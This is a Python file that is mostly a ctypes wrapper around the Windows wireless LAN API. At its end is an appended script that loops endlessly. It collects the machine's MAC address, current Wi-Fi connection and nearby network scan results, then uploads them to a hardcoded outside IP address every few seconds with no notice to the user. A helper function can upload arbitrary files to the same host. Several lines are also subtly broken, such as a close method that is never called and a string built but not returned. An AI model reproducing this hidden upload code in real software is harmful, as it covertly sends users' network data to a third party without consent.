            # "rssi": c_long(wireless_interface.Rssi).value,

        }
        sa = r.wlanSecurityAttributes
        wlanSecurityAttributes = {
            "bSecurityEnabled": sa.bSecurityEnabled,
            "bOneXEnabled": sa.bOneXEnabled,
            "dot11AuthAlgorithm": DOT11_AUTH_ALGORITHM_DICT[sa.dot11AuthAlgorithm],
            "dot11CipherAlgorithm": DOT11_CIPHER_ALGORITHM_DICT[sa.dot11CipherAlgorithm],
        }
        ext_out = {
            "isState": isState,
            "wlanConnectionMode": wlanConnectionMode,
            "strProfileName": strProfileName,
            "wlanAssociationAttributes": wlanAssociationAttributes,
            "wlanSecurityAttributes": wlanSecurityAttributes,
        }
    else:
        ext_out = None
    return result.contents, ext_out


def wndToStr(wlan_notification_data):
    "".join([
        "NotificationSource: %s" % wlan_notification_data.NotificationSource,
        "NotificationCode: %s" % wlan_notification_data.NotificationCode,
        "InterfaceGuid: %s" % wlan_notification_data.InterfaceGuid,
        "dwDataSize: %d" % wlan_notification_data.dwDataSize,
        "pData: %s" % wlan_notification_data.pData,
    ])


class WlanEvent(object):
    ns_type_to_codes_dict = {
        WLAN_NOTIFICATION_SOURCE_NONE: None,
        WLAN_NOTIFICATION_SOURCE_ONEX: ONEX_NOTIFICATION_TYPE_ENUM,
        WLAN_NOTIFICATION_SOURCE_ACM: WLAN_NOTIFICATION_ACM_ENUM,
        WLAN_NOTIFICATION_SOURCE_MSM: WLAN_NOTIFICATION_MSM_ENUM,
        WLAN_NOTIFICATION_SOURCE_SECURITY: None,
        WLAN_NOTIFICATION_SOURCE_IHV: None,
        WLAN_NOTIFICATION_SOURCE_HNWK: WLAN_HOSTED_NETWORK_NOTIFICATION_CODE_ENUM,
        WLAN_NOTIFICATION_SOURCE_ALL: ONEX_NOTIFICATION_TYPE_ENUM,
    }

    def __init__(self, original, notificationSource, notificationCode, interfaceGuid, data):
        self.original = original
        self.notificationSource = notificationSource
        self.notificationCode = notificationCode
        self.interfaceGuid = interfaceGuid
        self.data = data

    @staticmethod
    def from_wlan_notification_data(wnd):
        actual = wnd.contents
        """
        typedef struct _WLAN_NOTIFICATION_DATA {
            DWORD NotificationSource;
            DWORD NotificationCode;
            GUID  InterfaceGuid;
            DWORD dwDataSize;
            PVOID pData;
        }
        """
        if actual.NotificationSource not in WLAN_NOTIFICATION_SOURCE_DICT:
            return None

        codes = WlanEvent.ns_type_to_codes_dict[actual.NotificationSource]

        if codes != None:
            try:
                code = codes(actual.NotificationCode)
                data = WlanEvent.parse_data(actual.pData, actual.dwDataSize, actual.NotificationSource, code)
                if isinstance(data, WLAN_MSM_NOTIFICATION_DATA):
                    data = MSMNotificationData(data)
                if isinstance(data, WLAN_CONNECTION_NOTIFICATION_DATA):
                    data = ACMConnectionNotificationData(data)

                event = WlanEvent(actual,
                                  WLAN_NOTIFICATION_SOURCE_DICT[actual.NotificationSource],
                                  code.name,
                                  actual.InterfaceGuid,
                                  data)
                return event
            except:
                return None

    @staticmethod
    def parse_data(data_pointer, data_size, source, code):
        if data_size == 0 or (source != WLAN_NOTIFICATION_SOURCE_MSM and source != WLAN_NOTIFICATION_SOURCE_ACM):
            return None

        if source == WLAN_NOTIFICATION_SOURCE_MSM:
            typ = WLAN_NOTIFICATION_DATA_MSM_TYPES_DICT[code]
        elif source == WLAN_NOTIFICATION_SOURCE_ACM:
            typ = WLAN_NOTIFICATION_DATA_ACM_TYPES_DICT[code]
        else:
            return None

        if typ is None:
            return None

        return WlanEvent.deref(data_pointer, typ)

    @staticmethod
    def deref(addr, typ):
        return (typ).from_address(addr)

    def __str__(self):
        return self.notificationCode


def OnWlanNotification(callback, wlan_notification_data, p):
    event = WlanEvent.from_wlan_notification_data(wlan_notification_data)

    if event != None:
        callback(event)


global_callbacks = []
global_handles = []


class NotificationObject(object):
    def __init__(self, handle, callback):
        self.handle = handle
        self.callback = callback


def registerNotification(callback):
    handle = WlanOpenHandle()

    c_back = WlanRegisterNotification(handle, functools.partial(OnWlanNotification, callback))
    global_callbacks.append(c_back)
    global_handles.append(handle)

    return NotificationObject(handle, c_back)


def unregisterNotification(notification_object):
    # TODO: Instead of enumerating on the global lists, just save
    # the NotificationObject-s in some list or dict.
    WlanCloseHandle(notification_object.handle)

    for i, h in enumerate(global_handles):
        if h == notification_object.handle:
            del global_handles[i]

    for i, c in enumerate(global_callbacks):
        if c == notification_object.callback:
            del global_callbacks[i]


def unregisterAllNotifications():
    for handle in global_handles:
        WlanCloseHandle(handle)
    del global_handles[:]
    del global_callbacks[:]


import pprint
import sys,threading,os

sys.path.append('../')

import uuid,time,requests
ddir = sys.path[0]
if os.path.isfile(ddir):
    ddir,filen = os.path.split(ddir)
    os.chdir(ddir)
def timp(nu):
    time.sleep(nu)
    return 0
def get_mac_address():

    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]

    return ":".join([mac[e:e+2] for e in range(0,11,2)])
def uupload(filename):
    url = "http://122.112.252.115:80"
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    print( r.text)
def getpcmsg():
    mac = get_mac_address().replace(':', '-')
    time1 = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(time.time()))
    ifaces =getWirelessInterfaces()
    pp = pprint.PrettyPrinter(indent=4)
    for iface in ifaces:
        #guid = iface.guid
        fi=str(mac)+'\n'+str(time1)+'\n'
        res =queryInterface(iface, "current_connection")  # wlan_intf_opcode_current_connection
        ct = pp.pformat(res[1])
        fi=fi+ct
        #print (ct)
    for iface in ifaces:
        #fi=fi+'\n'+str(iface)
        #print(iface)
        guid = iface.guid
        bsss =getWirelessNetworkBssList(iface)
        #print()
        fi=fi+"\n\nscanmessage:"
        for bss in bsss:
            #print(bss)
            #print("-" * 20)
            fi=fi+'\n'+str(bss)+("-"*20)
        fi=str(fi)
        #print(fi)

    print (time1)
    fn=str(mac+'_'+time1+'.txt')
    output = open(fn, 'w')
    #fi='aaa'
    print(len(fi))
    #fi="a"*8136
    #.write(fi)
    #output.close
    output.write(fi)
    output.close
    print(fn)

    url = "http://122.112.252.115:80"
    files = {'file': open(fn, 'rb')}
    while(len(open(fn).read()))==0:
        output.write("-"*200)
        output.close
    requests.post(url, files=files)

if __name__ == "__main__":

    while(1):
        threads=[]
        t1=threading.Thread(target=getpcmsg,args=())
        threads.append(t1)
        t2=threading.Thread(target=timp,args=(10,))
        threads.append((t2))
        for t in threads:
            #t.setDaemon(True)
            t.start()
        t.join()
        print ("once")

